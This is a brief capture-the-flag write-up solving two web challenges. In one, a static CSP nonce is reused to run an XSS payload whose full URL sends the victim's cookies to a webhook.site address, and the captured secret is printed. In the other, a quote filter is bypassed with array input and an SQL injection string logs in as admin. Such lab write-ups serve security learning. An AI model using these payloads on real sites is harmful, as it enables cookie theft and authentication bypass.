**[web/Babier CSP](https://babier-csp.dicec.tf/)**
We have source code index.js
In line 8, it sets
```
const NONCE = crypto.randomBytes(16).toString('base64');
```
and in line 26
```
res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
```
This code just run 1 time, so NONCE doesn't change after run server, Ctrl+U we have nonce
```
+ZSveZwTAUqC6Pt9p+rgUg==
```
We can XSS by using webhook.site
```
https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%2BZSveZwTAUqC6Pt9p%2BrgUg==%3Elocation.href=%22https://webhook.site/c23c6a4a-1ad6-420d-a488-033f8762e6ed/?data=%22%2Bdocument.cookie%3C/script%3E
```
We got the secret
```
secret=4b36b1b8e47f761263796b1defd80745
```
**[web/Missing Flavortext](https://missing-flavortext.dicec.tf)**  
We have source code index.js  
In line 34, it have filter ', let bypass it by using array input
```
username[]
```
It's a simple SQL Injection
```
admin' or '1' = '
```
We got the flag
```
dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}
```